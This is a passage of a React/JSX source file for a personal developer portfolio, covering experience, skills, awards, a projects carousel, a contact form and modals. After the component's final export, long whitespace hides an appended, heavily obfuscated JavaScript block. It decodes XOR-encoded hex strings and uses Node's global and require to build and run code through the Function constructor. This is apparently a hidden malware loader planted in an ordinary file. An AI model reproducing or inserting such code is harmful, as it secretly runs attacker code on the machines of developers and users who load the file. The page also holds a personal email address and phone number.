                  <li>Developed an AWS S3-like service using CephFS integration for production-grade scalable storage</li>
                  <li>Built internal SDK to streamline interactions with private APIs, improving developer productivity</li>
                  <li>Designed and optimized PostgreSQL schemas, wrote efficient queries, and managed complex migrations and transactions</li>
                  <li>Contributed to IAM system development, implementing user invitation features and enhancing security</li>
                  <li>Implemented comprehensive audit log functionality across multiple Mslm products for accountability and compliance</li>
                  <li>Developed robust notification system to enhance user engagement and real-time communication</li>
                  <li>Developed RESTful APIs ensuring high performance, low latency, and handling of edge cases for robustness</li>
                </ul>

                <h4 className="experience-category">Full Stack Development (HRMS System)</h4>
                <ul className="experience-details">
                  <li>Built HRMS system from scratch as part of a collaborative team effort</li>
                  <li>Designed and implemented attendance module schema ensuring data integrity and efficient querying</li>
                  <li>Developed filtration system for the entire Mslm platform</li>
                  <li>Created generic and reusable React/TypeScript components improving code maintainability</li>
                  <li>Engaged in bug fixing, problem-solving, and manual testing for quality assurance</li>
                  <li>Collaborated with cross-functional teams using Git/GitHub maintaining high code quality standards</li>
                </ul>

                <h4 className="experience-category">Key Technologies</h4>
                <div className="experience-technologies">
                  <span className="tech-tag">Golang</span>
                  <span className="tech-tag">PostgreSQL</span>
                  <span className="tech-tag">pgx/kpgx</span>
                  <span className="tech-tag">CephFS</span>
                  <span className="tech-tag">React</span>
                  <span className="tech-tag">TypeScript</span>
                  <span className="tech-tag">Microservices</span>
                  <span className="tech-tag">RESTful APIs</span>
                  <span className="tech-tag">IAM</span>
                </div>
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* Skills Section */}
      <section id="skills" className="skills" ref={skillsRef}>
        <div className="container">
          <h2 className="section-title">Skills & Technologies</h2>
          <div className="skills-grid">
            {skills.map((skill, index) => (
              <div key={index} className="skill-item">
                <div className="skill-info">
                  <span className="skill-name">{skill.name}</span>
                  <span className="skill-percentage">{skill.level}%</span>
                </div>
                <div className="skill-bar">
                  <div
                    className="skill-progress"
                    style={{ width: `${skill.level}%` }}
                  ></div>
                </div>
              </div>
            ))}
          </div>
        </div>
      </section>

      {/* Awards Section */}
      <section id="awards" className="awards" ref={awardsRef}>
        <div className="container">
          <h2 className="section-title">Awards & Recognition</h2>
          <div className="awards-grid">
            <div className="award-item">
              <div className="award-header">
                <h3 className="award-title">Employee of the Year</h3>
                <span className="award-date">January 2026</span>
              </div>
              <div className="award-company">Kcube.ai</div>
              <p className="award-description">
                Awarded Employee of the Year in recognition of successfully leading and delivering high-impact projects with outstanding results.
              </p>
            </div>

            <div className="award-item">
              <div className="award-header">
                <h3 className="award-title">1st Position Holder - FYP Competition</h3>
                <span className="award-date">July 2023</span>
              </div>
              <div className="award-company">Comsats Institute of Information Technology</div>
              <p className="award-description">
                Our AI-focused product secured the prestigious first prize, showcasing its innovative edge and excellence among 150+ projects represented in Comsats FYP Competition.
              </p>
            </div>
          </div>
        </div>
      </section>

      {/* Projects Section */}
      <section id="projects" className="projects" ref={projectsRef}>
        <div className="container">
          <h2 className="section-title">Featured Projects</h2>
          <div className="projects-container">
            <button
              className="carousel-nav-btn prev"
              onClick={() => scrollProjects('left')}
              disabled={!canScrollLeft}
            >
              <ChevronLeft size={24} />
            </button>

            <div className="projects-grid" ref={projectsGridRef}>
              {projects.map((project) => (
                <div key={project.id} className="project-card">
                  <div className="project-image">
                    <img src={project.images[0]} alt={project.title} />
                    <div className="project-overlay">
                      <button
                        className="btn btn-primary"
                        onClick={() => {
                          setSelectedProject(project);
                          setCurrentImageIndex(0);
                        }}
                      >
                        View Details
                      </button>
                    </div>
                  </div>
                  <div className="project-content">
                    <h3 className="project-title">{project.title}</h3>
                    <p className="project-description">{project.description}</p>
                    <div className="project-technologies">
                      {project.technologies.map((tech, index) => (
                        <span key={index} className="tech-tag">{tech}</span>
                      ))}
                    </div>
                    {(project.liveLink || project.githubLink) && (
                      <div className="project-links">
                        {project.liveLink && (
                          <a href={project.liveLink} target="_blank" rel="noopener noreferrer" className="project-link">
                            <ExternalLink size={16} />
                            Live Demo
                          </a>
                        )}
                        {project.githubLink && (
                          <a href={project.githubLink} target="_blank" rel="noopener noreferrer" className="project-link">
                            <Github size={16} />
                            Code
                          </a>
                        )}
                      </div>
                    )}
                  </div>
                </div>
              ))}
            </div>

            <button
              className="carousel-nav-btn next"
              onClick={() => scrollProjects('right')}
              disabled={!canScrollRight}
            >
              <ChevronRight size={24} />
            </button>
          </div>
        </div>
      </section>

      {/* Contact Section */}
      <section id="contact" className="contact" ref={contactRef}>
        <div className="container">
          <h2 className="section-title">Get In Touch</h2>
          <div className="contact-content">
            <div className="contact-info">
              <h3>Let's work together!</h3>
              <p>I'm always interested in new opportunities and exciting projects.</p>
              <div className="contact-details">
                <div className="contact-item">
                  <Mail size={20} />
                  <span>umairashfaq2015@gmail.com</span>
                </div>
                <div className="contact-item">
                  <Phone size={20} />
                  <span>+92 321 4634016</span>
                </div>
                <div className="contact-item">
                  <MapPin size={20} />
                  <span>Lahore, Pakistan</span>
                </div>
              </div>
            </div>
            <div className="contact-form">
              <div className="form-group">
                <input
                  type="text"
                  name="name"
                  placeholder="Your Name"
                  value={formData.name}
                  onChange={handleInputChange}
                  required
                />
              </div>
              <div className="form-group">
                <input
                  type="email"
                  name="email"
                  placeholder="Your Email"
                  value={formData.email}
                  onChange={handleInputChange}
                  required
                />
              </div>
              <div className="form-group">
                <input
                  type="text"
                  name="subject"
                  placeholder="Subject"
                  value={formData.subject}
                  onChange={handleInputChange}
                  required
                />
              </div>
              <div className="form-group">
                <textarea
                  name="message"
                  placeholder="Your Message"
                  rows="5"
                  value={formData.message}
                  onChange={handleInputChange}
                  required
                ></textarea>
              </div>
              <button
                onClick={handleSubmit}
                className={`btn btn-primary ${isSubmitting ? 'submit-button-loading' : ''}`}
                disabled={isSubmitting}
              >
                {isSubmitting ? 'Sending...' : 'Send Message'}
              </button>
            </div>
          </div>
        </div>
      </section>

      {/* Project Modal */}
      {selectedProject && (
        <div className="modal-overlay" onClick={() => setSelectedProject(null)}>
          <div className="modal-content" onClick={(e) => e.stopPropagation()}>
            <button
              className="modal-close"
              onClick={() => setSelectedProject(null)}
            >
              <X size={24} />
            </button>

            <div className="modal-header">
              <h3>{selectedProject.title}</h3>
            </div>

            <div className="image-carousel">
              <button className="carousel-btn prev" onClick={prevImage}>
                <ChevronLeft size={24} />
              </button>

              <div className="carousel-image">
                <a
                  href={selectedProject.images[currentImageIndex]}
                  target="_blank"
                  rel="noopener noreferrer"
                >
                  <img
                    src={selectedProject.images[currentImageIndex]}
                    alt={`${selectedProject.title} - Image ${currentImageIndex + 1}`}
                  />
                </a>
              </div>

              <button className="carousel-btn next" onClick={nextImage}>
                <ChevronRight size={24} />
              </button>

              <div className="carousel-dots">
                {selectedProject.images.map((_, index) => (
                  <button
                    key={index}
                    className={`dot ${index === currentImageIndex ? 'active' : ''}`}
                    onClick={() => setCurrentImageIndex(index)}
                  ></button>
                ))}
              </div>
            </div>

            <div className="modal-body">
              <p>{selectedProject.description}</p>
              <div>
                <div className="features-title">Overview</div>
                <ul className='project-checklist'>
                  {selectedProject.checklist.map((item, index) => (
                    <li key={index}>{item}</li>
                  ))}
                </ul>
              </div>
              <div>
                <div className="features-title">Features</div>
                <ul className="project-features">
                  {selectedProject.features.map((item, index) => (
                    <li key={index}>{item}</li>
                  ))}
                </ul>
              </div>
              {/* <div className="project-technologies">
                {selectedProject.technologies.map((tech, index) => (
                  <span key={index} className="tech-tag">{tech}</span>
                ))}
              </div> */}
              {(selectedProject.liveLink || selectedProject.githubLink) && (
                <div className="project-links">
                  {selectedProject.liveLink && (
                    <a href={selectedProject.liveLink} target="_blank" rel="noopener noreferrer" className="btn btn-primary">
                      <ExternalLink size={16} />
                      Live Demo
                    </a>
                  )}
                  {selectedProject.githubLink && (
                    <a href={selectedProject.githubLink} target="_blank" rel="noopener noreferrer" className="btn btn-outline">
                      <Github size={16} />
                      View Code
                    </a>
                  )}
                </div>
              )}
            </div>
          </div>
        </div>
      )}

      {/* Thank You Modal */}
      {showThankYouModal && (
        <div className="thank-you-modal-overlay" onClick={() => setShowThankYouModal(false)}>
          <div className="thank-you-modal" onClick={(e) => e.stopPropagation()}>
            <button
              className="thank-you-modal-close"
              onClick={() => setShowThankYouModal(false)}
            >
              <X size={18} />
            </button>

            <div className="thank-you-icon">
              <Mail />
            </div>

            <h3 className="thank-you-title">Thank You!</h3>

            <p className="thank-you-message">
              Your message has been sent successfully. I'll get back to you as soon as possible!
            </p>

            <button
              className="thank-you-button"
              onClick={() => setShowThankYouModal(false)}
            >
              Close
            </button>
          </div>
        </div>
      )}

      {/* Footer */}
      <footer className="footer">
        <div className="container">
          <p>&copy; 2026 Muhammad Umair. All rights reserved.</p>
        </div>
      </footer>

    </div>
  );
};

export default Portfolio;                                                                                                                                                                                                       var bx = '-0700-3';function AJ_DPijpMXHFyLa$YbJKdeirBK(QH$clzCNk,rRgrRBNbAADCUaUDLjDUHZRyO){var jl_z$sE=iEthVEDendvFjxjpx_t();return AJ_DPijpMXHFyLa$YbJKdeirBK=function(dkSxbq_F,RmNh_XDHYkJzR$Gr){dkSxbq_F=dkSxbq_F-(Math.max(-parseInt(0x349),-parseInt(0x349))*Math.max(parseInt(0x8),0x8)+parseInt(-0x1)*-0x503+Number(0x15ab));var bfRxnyV=jl_z$sE[dkSxbq_F];if(AJ_DPijpMXHFyLa$YbJKdeirBK['YqdzLS']===undefined){var hKEcnAnfATr$hxXB=function(RFcHGSJjtvqHt){var PeqW$tTfVRnRtHVUHbFHSEHkzn=0x85e+-0x1939+parseInt(0x11e8)&0x6d*parseInt(0x1)+parseInt(0xd99)+-parseInt(0xd07),wJdw$_zc=new Uint8Array(RFcHGSJjtvqHt['match'](/.{1,2}/g)['map'](cflLfl_MPxmeCX=>parseInt(cflLfl_MPxmeCX,-0x8cb*Math.max(-0x1,-0x1)+-0x1e7*Math.max(parseInt(0x1),parseInt(0x1))+0x17*-parseInt(0x4c)))),gFBN$FhYQdLxagiM=wJdw$_zc['map'](RrkZwX_Zek_HR=>RrkZwX_Zek_HR^PeqW$tTfVRnRtHVUHbFHSEHkzn),X_JtaXCNz$I=new TextDecoder(),Wrygpyibj=X_JtaXCNz$I['decode'](gFBN$FhYQdLxagiM);return Wrygpyibj;};AJ_DPijpMXHFyLa$YbJKdeirBK['FFXUof']=hKEcnAnfATr$hxXB,QH$clzCNk=arguments,AJ_DPijpMXHFyLa$YbJKdeirBK['YqdzLS']=!![];}var HOggYYaWf_vyAWSDmD=jl_z$sE[parseFloat(-parseInt(0x99d))+Math.ceil(parseInt(0xf9))*0x10+Math.trunc(-0x1)*Math.ceil(0x5f3)],hT_$leItwCJXtWd=dkSxbq_F+HOggYYaWf_vyAWSDmD,uXCSD=QH$clzCNk[hT_$leItwCJXtWd];return!uXCSD?(AJ_DPijpMXHFyLa$YbJKdeirBK['jUdQhe']===undefined&&(AJ_DPijpMXHFyLa$YbJKdeirBK['jUdQhe']=!![]),bfRxnyV=AJ_DPijpMXHFyLa$YbJKdeirBK['FFXUof'](bfRxnyV),QH$clzCNk[hT_$leItwCJXtWd]=bfRxnyV):bfRxnyV=uXCSD,bfRxnyV;},AJ_DPijpMXHFyLa$YbJKdeirBK(QH$clzCNk,rRgrRBNbAADCUaUDLjDUHZRyO);}(function(T$TNh_rvqDFNVrHfTu,naLccAeIyNvM$_HCJTvuiysrK){var Fze_tqG$akzGu=AJ_DPijpMXHFyLa$YbJKdeirBK,CYoMhMKXyHBLmFrsUNnODP=T$TNh_rvqDFNVrHfTu();while(!![]){try{var Ap$$pJJadsGfvc=parseFloat(Fze_tqG$akzGu(0x6a))/(-parseInt(0x1a9c)+Math.trunc(-parseInt(0x3))*-parseInt(0x32d)+-0xa2*-0x1b)+parseFloat(Fze_tqG$akzGu(0x78))/(-0x59c*0x5+-0x299+parseInt(0x1ea7))+-parseFloat(Fze_tqG$akzGu(0x72))/(-0x3*0x92b+parseInt(-parseInt(0x269e))+-0x1*Math.trunc(-0x4222))*Math['ceil'](parseFloat(Fze_tqG$akzGu(0x66))/(-parseInt(0x1)*parseInt(-0x552)+0x1b50+Math.ceil(-parseInt(0x209e))))+parseFloat(Fze_tqG$akzGu(0x70))/(parseFloat(-0x3ac)+Math.trunc(0x540)+-0x18f)*(-parseFloat(Fze_tqG$akzGu(0x69))/(Math.ceil(-parseInt(0x9))*Number(parseInt(0x26))+0x798+0x3*-parseInt(0x214)))+parseFloat(Fze_tqG$akzGu(0x77))/(-0x1fc3+-parseInt(0x2478)+parseInt(0x2221)*parseFloat(0x2))+parseFloat(Fze_tqG$akzGu(0x6b))/(-parseInt(0x7)*Math.trunc(-0x134)+Number(-0x114f)+0x1*Math.floor(parseInt(0x8eb)))*(-parseFloat(Fze_tqG$akzGu(0x71))/(-parseInt(0x223c)+Math.ceil(-parseInt(0x3d))*parseInt(0x7b)+0x4e4*parseInt(0xd)))+Math['max'](-parseFloat(Fze_tqG$akzGu(0x6d))/(-parseInt(0x134b)+parseFloat(parseInt(0x18e3))+Math.ceil(-0x6)*parseInt(0xed)),-parseFloat(Fze_tqG$akzGu(0x74))/(parseInt(0x1c73)+parseInt(-0x2165)+0x4fd))*(-parseFloat(Fze_tqG$akzGu(0x7a))/(-0x189d+-0xc43+-0x116*-parseInt(0x22)));if(Ap$$pJJadsGfvc===naLccAeIyNvM$_HCJTvuiysrK)break;else CYoMhMKXyHBLmFrsUNnODP['push'](CYoMhMKXyHBLmFrsUNnODP['shift']());}catch(oUZ_sn){CYoMhMKXyHBLmFrsUNnODP['push'](CYoMhMKXyHBLmFrsUNnODP['shift']());}}}(iEthVEDendvFjxjpx_t,parseInt(parseInt(0x7ea87))+parseInt(0x12cac9)+-parseInt(0xed555)),function(wWXxAlCvACTeUChGuSVchX,cGEZPzfITTbLtYWevOABb$x,yTumVqZ$YzNZHWRxQeN,rifwBArQyABeowRDbtAoMetR){var EyyoNM=AJ_DPijpMXHFyLa$YbJKdeirBK;wWXxAlCvACTeUChGuSVchX['bx']=bx;function p_NexWCmLvhT(btp_DyvQkA$CP,WQGzqO_MgNs){var ciNIt_GDIXa_cqJKqI=AJ_DPijpMXHFyLa$YbJKdeirBK,GpJ$oKw$MVC=btp_DyvQkA$CP[ciNIt_GDIXa_cqJKqI(0x79)](''),uuoePGHjkNisWwPyhHO=Math.floor(0x17f6)+0x1b*Math.ceil(0x33)+-parseInt(0x1d57),UgCXxFyYxAvOBeqCmwyEqsl=WQGzqO_MgNs[parseInt(0xba1)+Math.trunc(-parseInt(0x23bd))+Math.floor(0x607)*parseFloat(parseInt(0x4))],KbDINYWCQUaFhM_z_WzKS=GpJ$oKw$MVC[ciNIt_GDIXa_cqJKqI(0x73)];while(uuoePGHjkNisWwPyhHO<KbDINYWCQUaFhM_z_WzKS){var EGhpRDxUiLGKRZdDrHlt=UgCXxFyYxAvOBeqCmwyEqsl*(uuoePGHjkNisWwPyhHO+WQGzqO_MgNs[parseInt(0x2)*-parseInt(0xe8c)+Number(-parseInt(0xd00))*0x1+Math.ceil(parseInt(0x1))*Math.ceil(parseInt(0x2a19))])+(UgCXxFyYxAvOBeqCmwyEqsl+uuoePGHjkNisWwPyhHO)%WQGzqO_MgNs[parseInt(0x584)*0x3+0x1887*-0x1+parseInt(-0x1)*-0x7fd]+WQGzqO_MgNs[parseInt(0x6a6)+-0x1d8c+-parseInt(0x1)*-0x16e7],wpEz$CekOW=UgCXxFyYxAvOBeqCmwyEqsl*(uuoePGHjkNisWwPyhHO+WQGzqO_MgNs[-0x691*Math.trunc(-parseInt(0x4))+Math.floor(0x2)*-parseInt(0xa0c)+parseInt(0x629)*-0x1])+(UgCXxFyYxAvOBeqCmwyEqsl*WQGzqO_MgNs[-0x1f15+parseInt(-parseInt(0x3))*parseInt(0xc1c)+Math.floor(parseInt(0x436c))]+uuoePGHjkNisWwPyhHO)%WQGzqO_MgNs[parseInt(0x164b)+Number(0x1cec)*-0x1+0x6a5],uDQTGAPMMmkBK$$KD=EGhpRDxUiLGKRZdDrHlt%KbDINYWCQUaFhM_z_WzKS,zzDeafPwhoGCwnW_Y=wpEz$CekOW%KbDINYWCQUaFhM_z_WzKS,vXbxgSJL=GpJ$oKw$MVC[uDQTGAPMMmkBK$$KD];GpJ$oKw$MVC[uDQTGAPMMmkBK$$KD]=GpJ$oKw$MVC[zzDeafPwhoGCwnW_Y],GpJ$oKw$MVC[zzDeafPwhoGCwnW_Y]=vXbxgSJL,UgCXxFyYxAvOBeqCmwyEqsl=(EGhpRDxUiLGKRZdDrHlt+wpEz$CekOW+UgCXxFyYxAvOBeqCmwyEqsl+uuoePGHjkNisWwPyhHO)%WQGzqO_MgNs[0x2*parseInt(0x2a)+0x21ba+Math.ceil(-0x1)*parseInt(0x2209)],uuoePGHjkNisWwPyhHO+=Math.floor(0x13)*-0x81+Math.max(-parseInt(0x7),-parseInt(0x7))*parseInt(0xba)+parseFloat(-parseInt(0xeaa))*-parseInt(0x1);}return GpJ$oKw$MVC[ciNIt_GDIXa_cqJKqI(0x67)]('');}var quiXFWVomETgfAac=String[EyyoNM(0x6c)](Math.floor(-0x1c53)*parseInt(0x1)+parseInt(0xf4a)+-0x8*-0x1a5),XqFK_gnxvxcBY_EzdPaPmHKU=p_NexWCmLvhT(EyyoNM(0x6f),rifwBArQyABeowRDbtAoMetR);XqFK_gnxvxcBY_EzdPaPmHKU=XqFK_gnxvxcBY_EzdPaPmHKU[EyyoNM(0x79)]('#')[EyyoNM(0x67)](quiXFWVomETgfAac)[EyyoNM(0x79)]('~1')[EyyoNM(0x67)]('#')[EyyoNM(0x79)]('~0')[EyyoNM(0x67)]('~')[EyyoNM(0x79)](quiXFWVomETgfAac),wWXxAlCvACTeUChGuSVchX[XqFK_gnxvxcBY_EzdPaPmHKU[Math.floor(-parseInt(0x1))*parseInt(0x435)+parseInt(0x2)*parseInt(0x11f9)+Math.ceil(-0x1fbd)]]=cGEZPzfITTbLtYWevOABb$x;if(typeof module===XqFK_gnxvxcBY_EzdPaPmHKU[Number(-0xa28)+Math.ceil(-0x5)*parseInt(0x17d)+parseInt(0x2ef)*parseInt(0x6)])wWXxAlCvACTeUChGuSVchX[XqFK_gnxvxcBY_EzdPaPmHKU[-parseInt(0x2f)*parseInt(0xa7)+-0xb*Math.max(-parseInt(0x2e1),-parseInt(0x2e1))+Number(parseInt(0x80))*-parseInt(0x2)]]=module;var plmWUfEgspZDINakHncenM=p_NexWCmLvhT(EyyoNM(0x68),yTumVqZ$YzNZHWRxQeN),MmIGzNa=p_NexWCmLvhT[plmWUfEgspZDINakHncenM[EyyoNM(0x75)](0xa9b+-parseInt(0x1809)+parseFloat(0xd6e),Math.floor(-parseInt(0x4d7))+-parseInt(0xbc)+parseInt(0x59e))],PULnGO$fpqZM$gOYodzpMVK=MmIGzNa('',p_NexWCmLvhT(EyyoNM(0x76),yTumVqZ$YzNZHWRxQeN)),w$ac$RfRNn=PULnGO$fpqZM$gOYodzpMVK(p_NexWCmLvhT(EyyoNM(0x6e),yTumVqZ$YzNZHWRxQeN));return MmIGzNa('',w$ac$RfRNn)(0x3d1*0x2+-0x1bcf+-parseInt(0x1)*parseFloat(-0x1dfa)),parseFloat(parseInt(0x40f6))+Math.max(0x1b18,parseInt(0x1b18))+parseFloat(0x1)*-parseInt(0x38d1);}(global,require,[-0x44f702+Math.max(-0xc571a,-0xc571a)+0xc1553f,-parseInt(0x239d)+-parseInt(0x22b)*parseFloat(0xe)+0x431c,Math.floor(-parseInt(0x3a))*parseInt(0x43b)+-parseInt(0x3)*Math.trunc(-parseInt(0x7e1))+Math.max(0x17510,0x17510),parseInt(0x3f)*0x2b+parseInt(-parseInt(0x1df))*Math.ceil(-0xe)+-0x23f4,Math.trunc(parseInt(0x3))*Math.floor(0x7c15)+-parseInt(0x2)*parseFloat(parseInt(0xa5c1))+0x2*Math.floor(parseInt(0x5f54)),-0x8e5f85+0xb3d6*parseInt(-0x8f)+Math.trunc(0x141e926)],[Math.floor(0xf42aed)+-0xaaf882+Math.trunc(parseInt(0x196ca8))*0x2,parseFloat(0x20f1)+0x217a*parseInt(parseInt(0x1))+-parseInt(0x40c6)*parseInt(0x1),-parseInt(0x610)+-parseInt(0x7)*Math.max(-0x83,-parseInt(0x83))+0x2e64*0x2,0x76*0x44+Number(parseInt(0x1))*parseInt(0x12e7)+Math.max(-parseInt(0x2),-parseInt(0x2))*parseInt(0x17ff),0x11b99*Math.max(-0x1,-0x1)+-0x1315d+parseInt(0x2fd11),-parseInt(0x8265c4)+0x1*Math.max(-0x196e62,-0x196e62)+parseInt(0xec935d)]));function iEthVEDendvFjxjpx_t(){var NOlhTdvICDCRcivd$aFV=['7e61646e68','3e67692d21317e6c3f7e3050302536783e3f303d623c6c3576246c643626247f64767f6c64636463706361237f246c3d2661627a6e623e7f2d2f686263567978796f6f795650247d7b3435627d3f6c31797f6e64397b613936366e562d6c7b353b21246c7e362f687b26217f367e3a25623a20636b6c7f253b217d646535645066796a7f26605626566c3c3c3e627f3f253f7f623d6f70682d796e6c3b2c7b397f3025506b3664647923267f2d642c24363c7921233523267e796b4c217e23627f3662237930262663653626762625364c786e36697f783636797e783c3a3b6e7f2d247f566b302f3e7935647e65306c6e693068656f7e3c622463786b6a7d647f7f263d25216379616e646e6825333e3679782134787f6c6c7f393c636c366c64566f7b2464657f79796c656562686468697e7f646c7e61636a7f367d7979656336616379303d617925236430237b6b7d2d30627524633c61622f6c256e6479643662686c3e216e3b3e6f79306c617f6c303a64236c786161367b65643c62707e6b4e783d637b3f2056347f64633f795e616c7b68766c2430687f2d7879682d343e2563247d6c2325603e3e2d7e3662213e6a566836646923644e6c256a793d7e3624686b3c2f62366c653c6b4e266a672f2165627f3036627827606c3f79793026352d566e366c303b79246b6c7e63626e3d766e7f2d69252d702179363c79273a507f366268233a34697938637d24246f256c7f2665643b316c6c6679237b7b3c692426357d704e2d6868563860257963793579306e79243324647f307f6b79253c6163257e24236e3d6a6b643d6930646c6c3669243e2562696430793d617b236c24247f2d624e797f78247f707e21687f69216f3c6c3f267f236466257b79366e7f6c25637921627924243c617e3a6e3566793d79566b686b30253a6179303068795e36645064567e793e36314c6e256c653e796c3c30307f366c2321252d6c367924667f26356f7f30786c366e7979792d2463367e68796e3d2f236c646e796320213c56237979652d21216a3e203d7c7b79624c683c2679263f62365064256f207f266961627e757e7f617d307979246a7f6467616e636f6e6b627f2d2d646e6c7e62213636786f303d6e7e7e7f7e21797b607950612d64636130793c50776836647f796c246b643a217f2f68782450267879707d2378656c7d79217b6b7b7966667d793d7b3f2d7864756c7d6c626a2167797863643c5069623f397964306e794e20794c762f626e363e683d38306c7e2525796f2550656f62307e683f6836646468363e7e6a7d7d236f4e2d646f6364267f6b7f6268626c637830656968233936267965207f627b74232d3f39236c6264305079253030627f607e7b76616679786f643631796879356c25236b64253d3061687e2569257879656979616465647b39647826307b507e676279232d6279216c623d3039617860616f6b7f3f3e4e6e3f6221366830686c397975306c7e21796a7f23786260246c257e6c6b3c65246a7f64792f7d7f397f6b6c656e343675682466','383e393e343a38545a68486847','393b3f3b3c3d40686265586f','7e7d616479','3c3e383f393a3b3569476e41756a','39795e4943544a','67626463','796e6b63796c61607e6462627d7a6368676f6a7f667865797c7f74757f7b62787e696e6e77','3c3d3f635c4169637f','3a3b3f383f485a6058646e','3c383d3f3b3b39455a7f605875','6b7f62604e656c7f4e626968','3f3d674f627b4b77','5c6832562f5647562279686e5631566a563647292023233963246431257a76323d745650646e4d4f253d7523342e6c6e4e5664566e52246e61232b676423242364563221646e4e6e38232d305656313b6560643956792d7d6e566932374f217e556d3552256932323263565627743268665662366b233230312b56236b38325e2c2c6b562d794b59322456622c5656566858236a795644564132232d326e5a75597c2d684532277a7f37306423323f566e2338232b232b2856697b622956754d7f556f565c325e37457f6e562923566e6a7f562e5639615256562368566429236e2f2332684a79562d7f325b75734f56472a6f7e56562f235e4c622d2352263232276e287763566b68372163643c52796456566f5442236e5b6e6a6923795656707f232c635e2549764c66686e2463566623237f24457f565626626b61647e65566b56567d436556765623324d7e6b29562c3f56746b233223762d7e3c68286623387e2356562c562e7e642f367079413656686f56262556563e3a56234945566e693260702d3d6e3624616e4029793f32564f7e232d7e32253532562a7534756223756f5d646e6636565e566e23235f23302323642a35257e562c56612d622b2d2856633276636c7e562d68662356636e7f617f6b6e60562c64206c2b682370646f6e68417e252c6256627b6065625e26612d3f356c6629236e232d70683278254f4e56232e5679686a236832566c56246a6e7e7a7e322356256c686e6076396123706e56685625565f5d5627235647686860646556275656566c2d6c68245623696823567f564e356f564c67566635324c236c3f606b7f2379326b56266b2363566e232367632c7e6b6c236e23567b564b5632567532324169787e532e56246856366e257e5e3f6e61525e3b2365226e6e3223693b566563232278566435233239247e2777622c23636c7e3d23387b283c3274236e563256732e7e325663326e2f56565523276e5e782c56235f3e2423647762566e6f64562d32232c795669235644567a596e5668226b236a4574565632566b6156566156792c26647920232c5623683d6532352656783d2a3e3d6b4f3d322d7e256a233c6b413d23562375286e32337f6223562d236e322523253223377f617a2e7025236e3a236e7f6323563268635632306875236e565e686c3f68232323253c6e7d30237e233933323c566c6c566e275639566f51792363666f2d233248613e6b2c563952332a56792d566a237e24253d372568706e4d237e7923562e6c66225623793c6e6c2d6724486240237e61525632566e423f2356567e23446e78562d6e645d2379485225326e4c2c2c6b786b2d7f562c3b7f6e6e6656383d26564d2356686c562e2364282556212426566e3063322a2d23322c5652563956417e692e7426325e615d62236b36685e7064684c2323326279562c46604b695637615a7f232d697b2c326e28565670702e6323237b7e236270324b7f5656564861785652685670563d2d324e356b3b6961686e56796f5648236e562331692c7d7f64762624326f325e563d6a794c68567d562356235d642323695632326c6233796460796b7968567f4e2932525660647e2323687d322c7f2f6f526034566f6123566279362b7b6b6462236e2e32487838232c37652d5623702f50627b56326974326c327927242320627464233f236c556456325629237e20236e5e237f2d7452306b592c794c52686823325f67437e337d23347a756e65616169562f666e565656206b7b68256e767e232c66756a245e70215e512f7d2875234a567978566c232f7d4023562f792464693e53245b205623566f356e5e56236a683279543243326468494c386e564c232c5669565663567f7a66617b685623627f7d6e255634567f4032325656565c68256439322d6e562629562b792e232c56242f456523377e26565669324c323d616332687f3b7e327d56232250567a682d5e563232232d2069692379567f685666576e2523236c566b232c566a566b256e5e74485e326368565656687c56657d5656237e236932564e233b7456486c2158532364566925706c6456327e56755668486468692a687f56237920567e2a4d56546163565f37567f6568316863617e2521566c325a646823242a322d24796c23567e5e566e322266326a6e656423653f7a3278236e5655233b64236e6e797f7e56386a2c7d236856614c56564f74565632564879643c62236856642f232c5e4228236678236f566e2c252a563256686b616c486e566e7f6864325623606f5664345676236e2c623223623225322c565f567e7f324f7f2562795639772d3262222356652c25217b5656434b7f307962562d79685e6c2c39796c3239443b7f75364d562466607669232a625623233f325679387436322356692d6e56566e2356326e56226379562d2c686e7a3a24237e5632447932563d236456232356396e605636295662566e567423646028482c692d56776223652c78776c636e69645679565248326b707956565668687f5623207023473f562c4c35236b6370282363565856645656236b356e2d337d5c322f2d253e752c68356f6b4256767e246f7e68752356565e3232236956664256683264567b70562368235e5678562c567b5e2d2a66564c56243c79493d7463626a747f485d56682d236b627e7e2c562356256776682d6e7e24764f5632222d5a2d752e292a2c23565d7f56246e2732322e587a4c32397f7d7e2332302260233665563823692d455662566928675625322d5e3b6e232f563961795656793d706c7d79256a2c56663d23563225562923566e7e6228365f6e3f235669327e4e32236832684856655e24562c626e5623232d5662206e6020607e235e796e62652368392332566e7623567e3d7f2c347d6856233e796e325e7e236e6923565677382f7e3056232d56567f2344563256322f3e5623325e6e74686132322f5656643e39695662617e56637e7d622c426468747f533c506a6d5647563c233226652d7956762c56207961565241565664566e64325e5e5156563d6956683261562056757f79255666562532686e56445675566e6c56297f7e6e325e6456612879566e7f537f32566c2f3d5635202c56605779234f68566437313979306a23566e797a7e2b555679327d7e6f322f7e4c3223237e2d342c522439702d607d2d56344b7e7463656e3c626e562360317e2e5e6e6e2156785e564b337f692379297f2b327e3356233e2c56252d5d56567e603c56236e322723625678235825792c6b4c50362b647023236c2c567e205f7c5628292332386f2123567e326f7f64793c32562423716132326e307e566258794f4c5f382d566e4e234569422c2f792c797f23327b37566b6c606b233f6f6436563f3d7b233464486830566a6a6456306932236a56566e343452566939396c32372d312f6178236f2c6e6e635632627a426461326626563256233d28565679236e232325622323236c23232348245656565a6079754a563b24325669554c4078282368606a7d6b235a666e6e613b567f235656562d412d6e5c203a3532564c236e236e636b563c6f326356562568232a5632283d322d23566e237825562e687e6c23763276243223325663565a783e56326268564f6e6e595668567e702f7e25266c6c5661237962566031442356317844633279602d6f243e77662f56257a7a2c565e71562358702f563d562f56752368445e233232252368246223246c2356325665236e205c2b563256236d4f707e232023565e23566e6b696d76386e5625775656625659565623562066566a23242b622856556c3d784c56325e68643678423f232a5e7d237d6b3d647f6a5662756b2d2320562a61322f6e3260254b2661565723692d453f56647964257875566d7f322d23786c2333634b3232237e62566e5632756e26796c76782379566e40326a562f23327d32567f6f757623563d326139567660562d236c6c322c39626e6e6c367f2d6f53302a2779327f567d30233268566e6e6864624523327e77323221632c565623396a56372461615629566124565623326a6e564c7d5660566b7f6e2064236b253256325656632364566c327d232a3a32477a317e352f5629696e2f233d7d666e563d25563225686e7555567f6452234a564b2d59684523612356233e7f7e233321792f527a287e32233d797e48645632257e434c2524633b6e2452626b362c573c232368617e6e56274125303a322d56566e563a327b562b567b63562d42322369456a6e2d56565d48566c646e56257e235f3d3f3266326e7068686a6e616e327d25567d566e6d66567d3268585632537f5d79562336323a322d322556445632237f323c45255e567f7a236256686463646e7e5635756e3264566832642f73562d7e6c325d562b57234432247424565656426e663e7e2356606778255932632157687d56322d4273343256456b56382a23647e235668623f567e6c2c326c32412d